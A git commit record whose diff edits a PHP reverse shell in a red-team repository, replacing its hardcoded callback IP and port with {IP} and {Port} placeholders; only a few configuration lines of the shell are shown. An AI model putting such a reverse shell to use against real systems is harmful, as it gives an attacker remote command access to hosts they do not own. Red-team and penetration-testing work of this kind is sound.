c2a2f99c432bddef7c3ed5b1f51b54f429e4ab8d
Matt T <85061655+Mattluna@users.noreply.github.com>
2026-09-22 10:08:16 -0400

    Modify IP and port variables for reverse shell
    Updated IP address and port placeholders for configuration.

--- Red_team/Reverse_Shells/php.php
+++ Red_team/Reverse_Shells/php.php
@@ -5,8 +5,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '{IP}';  // CHANGE THIS
+$port = {Port};       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
